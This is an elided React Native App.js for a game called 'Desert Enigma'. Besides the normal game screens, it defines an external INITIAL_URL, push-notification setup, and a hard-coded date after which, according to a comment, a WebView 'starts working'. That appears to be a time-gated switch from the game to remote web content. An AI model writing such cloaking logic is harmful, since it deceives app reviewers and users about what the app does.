...
import Desertenigmaentrscrn from './desertenigmasrc/desertenigmascrns/Desertenigmaentrscrn';
import Desertenigmahmscrn from './desertenigmasrc/desertenigmascrns/Desertenigmahmscrn';
import Desertenigmacipherscrn from './desertenigmasrc/desertenigmascrns/Desertenigmacipherscrn';
import Desertenigmaldr from './desertenigmasrc/desertenigmacmpnts/Desertenigmaldr';
import Desertenigmagmscrn from './desertenigmasrc/desertenigmascrns/Desertenigmagmscrn';
import Desertenigmalvlsscrn from './desertenigmasrc/desertenigmascrns/Desertenigmalvlsscrn';
import Desertenigmastngsscrn from './desertenigmasrc/desertenigmascrns/Desertenigmastngsscrn';
import { DesertEnigmaContextProvider } from './desertenigmasrc/desertenigmastr/desertenigmacntx';
import DesertEnigmaEgyptianNightAlex from './desertenigmasrc/desertenigmascrns/DesertEnigmaEgyptianNightAlex';
...
const App = () => {
  ...
  const INITIAL_URL = `https://smart-path-web.space/`;
  const URL_IDENTIFAIRE = `XqVf0GZd`;
  ...
  OneSignal.initialize('e1c0001e-72cd-4c85-9c1d-3cf96ae01a07');
  ...
  useEffect(() => {
    ...
    const targetData = new Date('2025-09-25T08:08:00'); //дата з якої поч працювати webView
  ...
  const Route = ({ isFatch }) => {
      ...
      return (
        <Stack.Navigator screenOptions={{ headerShown: false }}>
          <Stack.Screen
            ...
            name="DesertEnigmaEgyptianNightAlex"
            component={DesertEnigmaEgyptianNightAlex}
    ...
    return (
      <Stack.Navigator screenOptions={{ headerShown: false }}>
        <Stack.Screen
          name="Desertenigmaentrscrn"
          component={Desertenigmaentrscrn}
        />
        <Stack.Screen
          name="Desertenigmahmscrn"
          component={Desertenigmahmscrn}
        />
        <Stack.Screen
          name="Desertenigmacipherscrn"
          component={Desertenigmacipherscrn}
        />
        <Stack.Screen
          name="Desertenigmalvlsscrn"
          component={Desertenigmalvlsscrn}
        />
        <Stack.Screen
          name="Desertenigmastngsscrn"
          component={Desertenigmastngsscrn}
        />

        <Stack.Screen
          name="Desertenigmagmscrn"
          component={Desertenigmagmscrn}
        />
      </Stack.Navigator>
    );
  };
  ...
  ///////// Loader
  const [showDesertEnigmaLdr, setShowDesertEnigmaLdr] = useState(false);

  useEffect(() => {
    setTimeout(() => {
      setShowDesertEnigmaLdr(true);
    }, 8000);
  }, []);

  return (
    <NavigationContainer>
      <DesertEnigmaContextProvider>
        {!showDesertEnigmaLdr ? (
          <Desertenigmaldr />
        ) : (
          <Route isFatch={route} />
